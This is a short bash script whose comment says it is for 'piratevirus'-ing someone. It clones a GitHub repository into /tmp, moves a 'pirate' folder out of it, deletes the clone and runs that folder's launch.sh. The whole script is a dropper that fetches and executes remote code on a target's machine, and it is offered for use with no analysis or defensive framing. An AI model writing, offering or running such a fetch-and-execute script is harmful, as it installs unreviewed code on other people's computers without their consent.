#!/bin/bash

# If you just want to piratevirus someone
# this depends on them having git installed.
# ... maybe I should just have it download a zip...

cd /tmp
git clone https://github.com/phobosgroup/dtc2.git
cd dtc2
mv pirate ../piratefiles
cd ../
rm -rf dtc2
cd piratefiles
sh launch.sh
